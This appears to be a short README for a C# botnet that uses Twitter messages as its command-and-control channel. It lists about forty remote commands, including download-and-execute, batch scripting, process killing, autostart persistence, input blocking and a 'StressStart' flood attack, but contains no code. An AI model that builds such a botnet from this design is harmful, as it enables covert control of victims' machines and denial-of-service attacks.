# Twitter-bot

A simple Botnet written in c-sharp, use Twitter message as C&C.
---------------------
 payload: 9e2536fde5a8cf7ebdec0fd4527860759b96e880
 
C&C = [
"FileAttribute",

"crasher",	  #WriteProcessMemory to certain process

"closeFileMgr",

"FileMgr",	  #GetDrivers info

"panic",	  #AutoStart

"CLOSETCP",

"Monitor_off",

"Monitor_on",

"Taskbar_off",

"Taskbar_on",

"Desktop_off",

"Desktop_on",

"Blockinput_on",

"Blockinput_off",

"Messagebox",

"Hidewindow",

"Shutdown",

"Logoff",

"Restart",

"critical_off",

"critical_on",

"Delete",

"Execute",

"crash",

"Swapmousebuttons_on", #swap mouse

"Swapmousebuttons_off",

"Download",

"Beeper_on",

"Beeper_off",

"Beeper_Bomb",

"Restart_client",

"Close_Client",

"Killprocess",

"Windowtitle",  #set window title

"Crazymouse",   #set random SetCursorPos

"Remotedesktop_on",

"Remotedesktop_off",

"BatchScripting",

"StressStart",	# flood attack

"StressStop"
]


(To be continued.)
